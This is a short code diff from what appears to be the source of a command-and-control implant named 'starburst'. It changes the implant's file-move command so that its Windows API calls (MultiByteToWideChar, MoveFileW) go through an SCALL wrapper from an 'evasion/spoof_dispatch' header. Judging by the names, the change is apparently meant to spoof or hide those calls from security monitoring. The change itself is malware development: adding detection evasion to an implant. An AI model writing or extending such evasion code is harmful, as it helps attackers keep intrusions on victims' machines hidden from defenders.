@@ -4,6 +4,7 @@
 #include <parser.h>
 #include <config.h>
 #include <strings.h>
+#include <evasion/spoof_dispatch.h>
 
 #ifdef INCLUDE_CMD_MV
 
@@ -36,10 +37,10 @@ auto declfn starburst::cmd_mv(
 
     wchar_t wsrc[520] = { 0 };
     wchar_t wdst[520] = { 0 };
-    inst.kernel32.MultiByteToWideChar( CP_ACP, 0, src_buf, -1, wsrc, 520 );
-    inst.kernel32.MultiByteToWideChar( CP_ACP, 0, dst_buf, -1, wdst, 520 );
+    SCALL( inst, kernel32.MultiByteToWideChar, CP_ACP, 0, src_buf, -1, wsrc, 520 );
+    SCALL( inst, kernel32.MultiByteToWideChar, CP_ACP, 0, dst_buf, -1, wdst, 520 );
 
-    if ( inst.kernel32.MoveFileW( wsrc, wdst ) ) {
+    if ( SCALL( inst, kernel32.MoveFileW, wsrc, wdst ) ) {
         queue_response( inst, task_uuid, RESPONSE_SUCCESS,
             symbol<char*>( const_cast<char*>( "moved" ) ) );
     } else {
